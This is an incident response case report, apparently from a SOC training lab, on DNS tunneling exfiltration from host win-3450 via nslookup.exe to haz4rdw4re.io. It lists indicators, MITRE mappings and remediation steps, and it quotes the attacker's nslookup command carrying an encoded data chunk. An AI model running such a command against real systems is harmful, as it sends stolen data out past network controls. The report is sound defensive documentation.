# Alert 1027 Case Report - Active Data Exfiltration via DNS Tunneling (nslookup.exe Secondary Payload Chunk)

## 1. Summary
* **Classification:** True Positive
* **Severity:** Critical
* **Escalation Required:** Yes
* **Timestamp:** `09/07/2026 18:09:34.240`
* **Summary:** A Critical True Positive incident was identified on host `win-3450` (belonging to Michael Ascot) involving a secondary DNS exfiltration stream. The compromised PowerShell process (PID: 3728) spawned `nslookup.exe` (PID: 5432) from the staged exfiltration directory, transmitting encoded data payload chunks (`U3VtbWFpYE5SNEhNNC...`) to the C2 domain `haz4rdw4re.io`.

---

## 2. Affected Entities & Host Details
* **Source Host:** `win-3450`
* **User Account:** `michael.ascot` (Michael Ascot)
* **Target C2 Domain:** `U3VtbWFpYE5SNEhNNC87JTM0CgyKk.haz4rdw4re.io`

---

## 3. Indicators & Process Artifacts
* **Parent Process:** `powershell.exe` (PID: 3728)
* **Child Process:** `nslookup.exe` (PID: 5432)
* **Working Directory:** `C:\Users\michael.ascot\downloads\exfiltration\`
* **Command Line:** `"C:\Windows\system32\nslookup.exe" U3VtbWFpYE5SNEhNNC87JTM0CgyKk.haz4rdw4re.io`
* **Event Code:** Sysmon Event ID 1 (Process Create)
* **Threat Activity:** Covert Data Exfiltration & C2 Tunneling (MITRE ATT&CK T1071.004, T1048.003, T1132.001)
* **Malicious Indicators:** Execution of native binary `nslookup.exe` with base64/high-entropy subdomain payloads directed at an untrusted external domain (`haz4rdw4re.io`).

---

## 4. Triage & Analysis

**True Positive Justification:**
Sysmon Event ID 1 (Process Creation) logs confirm `powershell.exe` (PID: 3728) spawned `nslookup.exe` (PID: 5432) executing directly out of the staging folder (`C:\Users\michael.ascot\downloads\exfiltration\`). The specific query string contains a structured, encoded payload sublabel (`U3VtbWFpYE5SNEhNNC87JTM0CgyKk`), confirming active automated DNS tunneling to exfiltrate staged files piece-by-piece via DNS queries.

**Escalation Justification:**
Critical escalation is required. This activity represents ongoing, active data exfiltration following the local collection and initial tunneling phases (ALT-28 through ALT-32). DNS tunneling bypasses typical web proxies and firewalls by leveraging port 53 traffic, confirming an active compromise on `win-3450` that requires immediate network isolation and domain blocking to prevent further data loss.

---

## 5. Resolution & Actions
1. **Immediate Host Isolation:** Network-isolate host `win-3450` immediately to sever all active DNS exfiltration streams.
2. **Process Termination:** Terminate parent process `powershell.exe` (PID: 3728) and child process `nslookup.exe` (PID: 5432).
3. **DNS Infrastructure Blocking:** Add `haz4rdw4re.io` and all associated wildcard subdomains (`*.haz4rdw4re.io`) to enterprise DNS sinkholes, perimeter firewalls, and proxy blocklists.
4. **Credential Remediation:** Invalidate active user sessions and force an immediate domain password reset for account `michael.ascot`.
5. **Exfiltration Forensics:** Analyze internal DNS resolver query logs for all requests associated with `*.haz4rdw4re.io` and `*.h4z4rdw4re.io` to reassemble transmitted chunks and determine the complete volume of exfiltrated data.

## 6. Screenshots
<img width="2556" height="1386" alt="ALT-1027-Log" src="https://github.com/user-attachments/assets/d1300b57-22dd-4c72-9e47-1e0948caf440" />
<img width="2560" height="1392" alt="ALT-1027" src="https://github.com/user-attachments/assets/d71a0b2b-4504-49c4-b0c9-d1506a92bc5b" />
